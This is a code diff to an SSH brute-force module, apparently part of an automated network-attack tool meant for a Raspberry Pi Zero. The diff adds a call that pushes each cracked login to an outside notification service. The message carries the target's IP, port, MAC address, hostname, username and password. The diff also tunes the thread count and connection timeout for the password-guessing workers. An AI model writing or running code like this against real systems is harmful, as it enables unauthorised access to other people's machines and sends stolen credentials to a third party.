@@ -13,6 +13,7 @@ from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="ssh_connector.py", level=logging.DEBUG)
@@ -91,7 +92,7 @@ class SSHConnector:
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         
         try:
-            ssh.connect(adresse_ip, username=user, password=password, banner_timeout=200)  # Adjust timeout as necessary
+            ssh.connect(adresse_ip, username=user, password=password, banner_timeout=30)  # Adjust timeout as necessary
             return True
         except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
             return False
@@ -112,8 +113,11 @@ class SSHConnector:
                 with self.lock:
                     self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                     logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+                    message = f"SSH Brute force on {adresse_ip} : {port} | mac addr: {mac_address} | hostname: {hostname} | User : {user} | Password: {password}"
+                    send_ntfy(message=message)
                     self.save_results()
                     self.removeduplicates()
+
                     success_flag[0] = True
             self.queue.task_done()
             progress.update(task_id, advance=1)
@@ -140,7 +144,7 @@ class SSHConnector:
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
             
-            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+            for _ in range(5):  # Adjust the number of threads based on the RPi Zero's capabilities
                 t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                 t.start()
                 threads.append(t)
